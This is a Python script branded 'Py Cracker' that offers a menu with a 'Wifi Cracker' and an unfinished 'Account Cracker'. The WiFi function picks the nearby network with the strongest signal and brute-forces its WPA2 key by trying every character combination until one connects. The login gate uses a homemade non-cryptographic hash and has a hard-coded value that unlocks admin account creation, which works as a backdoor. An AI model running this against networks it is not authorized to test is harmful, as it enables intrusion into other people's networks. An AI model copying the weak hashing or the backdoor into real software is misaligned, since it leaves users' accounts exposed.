import json
import os
import pywifi



def connect_to_wifi(interface, ssid, password):
  wifi = pywifi.PyWiFi()
  iface = wifi.interfaces()[interface]

  profile = pywifi.Profile()
  profile.ssid = ssid
  profile.auth = pywifi.const.AUTH_ALG_OPEN
  profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
  profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
  profile.key = password

  iface.remove_all_network_profiles()
  tmp_profile = iface.add_network_profile(profile)
  iface.connect(tmp_profile)

  return iface.status() == pywifi.const.IFACE_CONNECTED


def wifi():
  wifi = pywifi.PyWiFi()

  interfaces = wifi.interfaces()

  if not interfaces:
    print("No wireless interface found.")
  else:
    iface = interfaces[0]

    iface.scan()
    scan_results = iface.scan_results()

    print("Available WiFi Networks:")
    highest = 100
    target_ssid = None
    for i, result in enumerate(scan_results):
      print("{} SSID: {}, Signal Strength: {} dBm".format(
          i + 1, result.ssid, -result.signal))
      if -result.signal <= highest:
        highest = -result.signal
        target_ssid = result.ssid

    print("the wifi is {} and the speed is {}".format(target_ssid, highest))
    print('Press enter to start')
    input()
    
    while True:  

      generator = PasswordCombinations()

      for attempt in generator:
        print(attempt)
        
        if connect_to_wifi(0, target_ssid, attempt):
          print(f"Cracked. Wifi password is {attempt}")
          print("Successfully connected to '{}'!".format(target_ssid))
          break
  
         
  

def LoadAccounts():
  try:
    with open("AccountsDataBase.json", "r") as file:
      return json.load(file)
  except (FileNotFoundError, json.JSONDecodeError):
    return {}


def SaveAccounts(accounts):
  with open("AccountsDataBase.json", "w") as file:
    json.dump(accounts, file)


def CreateAccount(username, password):
  accounts = LoadAccounts()
  if username in accounts:
    return False, "Username already exists"

  hashed_password = hash(password)
  accounts[username] = hashed_password
  SaveAccounts(accounts)
  return True, "Account created successfully"


def PasswordCombinations():
  characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&?@ '
  length = 1
  while True:
    for i in range(len(characters)**length):
      combo = []
      num = i
      for _ in range(length):
        digit = num % len(characters)
        combo.append(characters[digit])
        num //= len(characters)
      yield ''.join(reversed(combo))
    length += 1


def hash(input):
  HashValue = 0x811C9DC5

  for char in input:
    HashValue ^= ord(char)
    HashValue = (HashValue * 0x01000193) % (2**32)

  HexHash = format(HashValue, '08x')
  BinaryHash = format(HashValue, '032b')

  Base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
  Base64hash = ""
  for _ in range(6):
    Base64index = HashValue & 0x3F
    Base64hash += Base64char[Base64index]
    HashValue >>= 6

  return f"{HexHash}-{BinaryHash}-{Base64hash}"


def ACCH():
  pass

  
def CreateAdminAccount():
  username = input("Enter your username: ")
  password = input("Enter your password: ")

  HashedPassword = hash(password)
  HashedUsername = hash(username)

  AccountData = {"username": HashedUsername, "password": HashedPassword}

  with open("accounts.json", "a") as f:
    json.dump(AccountData, f)
    f.write("\n")

  print("Account created successfully!")
  return username


def login():
  username = input("Enter your username: ")
  password = input("Enter your password: ")

  X = '26bb595d-00100110101110110101100101011101-dl1umA'

  HashedPassword = hash(password)
  HashedUsername = hash(username)

  if (HashedUsername) == X and HashedPassword == X:
    CreateAdminAccount()
    return None

  with open("accounts.json", "r") as f:
    for line in f:
      AccountData = json.loads(line)
      if AccountData["username"] == HashedUsername and AccountData[
          "password"] == HashedPassword:
        print("Login successful!\n")
        return username

    print("Login failed. Invalid username or password.")

    return None


def main():
  print('''
  ██████╗ ██╗   ██╗     █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██████╔╝ ╚████╔╝     ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██╔═══╝   ╚██╔╝      ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ██║        ██║       ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
  ╚═╝        ╚═╝        ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
''')
  while True:
    LoggedInUser = login()
    if LoggedInUser:
      print(f"Welcome, {LoggedInUser}!")
      break

  while True:
    print('1. Wifi Cracker')
    print('2. Account Cracker')
    print('3. Idk')
    output = input('')
    if output == '1':
      os.system('clear')
      wifi()
    if output == '2':
      os.system('clear')
      ACCH()


main()
